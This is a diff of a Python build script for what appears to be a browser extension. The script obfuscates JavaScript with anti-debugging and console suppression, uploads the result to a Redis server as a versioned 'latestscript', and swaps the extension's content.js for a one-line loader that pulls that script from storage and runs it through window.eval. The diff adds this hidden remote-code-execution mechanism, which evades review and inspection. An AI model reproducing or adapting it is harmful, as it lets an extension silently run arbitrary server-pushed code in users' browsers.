@@ -19,10 +19,10 @@ class PyObfuscator:
                 "code": lines, 
                 "options": {
                     "compact": True,
-                    "controlFlowFlattening": True,
-                    "controlFlowFlatteningThreshold": 0.6,
-                    "deadCodeInjection": True,
-                    "deadCodeInjectionThreshold": 0.6,
+                    "controlFlowFlattening": False,
+                    "controlFlowFlatteningThreshold": 0,
+                    "deadCodeInjection": False,
+                    "deadCodeInjectionThreshold": 0,
                     "debugProtection": True,
                     "debugProtectionInterval": True,
                     "disableConsoleOutput": True,
@@ -92,15 +92,15 @@ for file in files:
                     final = final.replace('runAll',"function(){" + functionInject + "}")
 
                 if('content.js' in file):
-                    r.set('latestscript',json.dumps({'version':'1.1','script':final}))
-                    print('updated latest script on server')
+                    version = json.loads(r.get('latestscript'))['version']
+                    print('got ' + version  + ' from server') 
+                    splitver = version.split('.')
+                    splitver[-1] = str(int(splitver[-1]) + 1)
+                    finalversion = '.'.join(splitver)
+                    r.set('latestscript',json.dumps({'version':finalversion,'script':final}))
+                    print('updated latest script on server to ' + finalversion)
                 
-                    final = PyObfuscator().obfuscate("""
-                    chrome.storage.local.get(['latestscript'],function({latestscript}){
-                        if(latestscript){
-                            eval(latestscript);
-                        }
-                    })""")
+                    final = ("""chrome.storage.local.get(["latestscript"],function({latestscript:t}){t&&window.eval(t)});""")
 
                 with open(os.path.join(output, file), 'w') as f:
                     f.write(final)
